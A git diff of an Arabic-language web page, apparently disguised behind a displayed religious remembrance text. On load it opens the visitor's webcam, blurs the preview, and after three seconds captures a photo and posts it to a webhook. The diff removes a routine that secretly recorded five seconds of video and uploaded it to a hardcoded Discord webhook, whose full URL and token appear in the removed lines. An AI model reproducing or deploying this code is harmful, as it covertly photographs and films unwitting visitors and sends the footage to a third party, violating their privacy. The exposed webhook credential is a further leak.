@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة وفيديو تلقائي</title>
+    <title>التقاط صورة تلقائي</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,18 +15,14 @@
             color: #333;
         }
         video {
-            width: 80%;
+            width: 100%;
             max-width: 600px;
             border: 1px solid #ddd;
             margin-bottom: 20px;
-            filter: blur(10px); /* إضافة فلتر تشويش على الفيديو */
+            filter: blur(10px); /* تطبيق فلتر تشويش على الفيديو */
         }
         canvas {
             display: none;
-        }
-        .message {
-            margin-top: 20px;
-            font-size: 18px;
         }
         .prayer {
             font-size: 22px;
@@ -37,7 +33,7 @@
 </head>
 <body>
 
-    <h1>التقاط صورة وفيديو تلقائي عند تحميل الصفحة</h1>
+    <h1>التقاط صورة تلقائي</h1>
     
     <!-- عرض الذكرى بشكل تلقائي -->
     <div>
@@ -60,8 +56,6 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let stream;
-        let recorder;
-        let chunks = [];
 
         // بدء تشغيل الفيديو من كاميرا الويب عند تحميل الصفحة
         async function startVideo() {
@@ -69,35 +63,19 @@
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                // التقاط صورة وفيديو تلقائيًا بعد 3 ثواني
-                setTimeout(captureImage, 3000);  // التقاط صورة بعد 3 ثواني
-                setTimeout(startRecording, 6000);  // بدء تسجيل الفيديو بعد 6 ثواني
+                // التقاط صورة تلقائيًا بعد 3 ثواني من تحميل الصفحة
+                setTimeout(captureImage, 3000); // التقاط صورة بعد 3 ثواني
             } catch (err) {
                 message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
                 console.error("خطأ في الوصول إلى الكاميرا: ", err);
             }
         }
 
-        // التقاط صورة تلقائيًا
+        // التقاط صورة تلقائيًا بعد 3 ثواني
         function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
             sendImageToWebhook(imageData);
-        }
-
-        // بدء تسجيل الفيديو تلقائيًا
-        function startRecording() {
-            chunks = [];
-            recorder = new MediaRecorder(stream);
-            recorder.ondataavailable = (e) => chunks.push(e.data);
-            recorder.onstop = () => sendVideoToWebhook();
-            recorder.start();
-            message.textContent = "يتم تسجيل الفيديو...";
-
-            // التوقف عن التسجيل بعد 5 ثواني
-            setTimeout(() => {
-                recorder.stop();
-            }, 5000);
         }
 
         // إرسال الصورة إلى الـ Webhook
@@ -119,29 +97,6 @@
             } catch (err) {
                 message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
                 console.error("Error sending image:", err);
-            }
-        }
-
-        // إرسال الفيديو إلى الـ Webhook
-        async function sendVideoToWebhook() {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('video', blob, 'video.webm');
-
-            try {
-                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    message.textContent = "تم إرسال الفيديو بنجاح!";
-                } else {
-                    message.textContent = "حدث خطأ أثناء إرسال الفيديو.";
-                }
-            } catch (err) {
-                message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
-                console.error("Error sending video:", err);
             }
         }
 
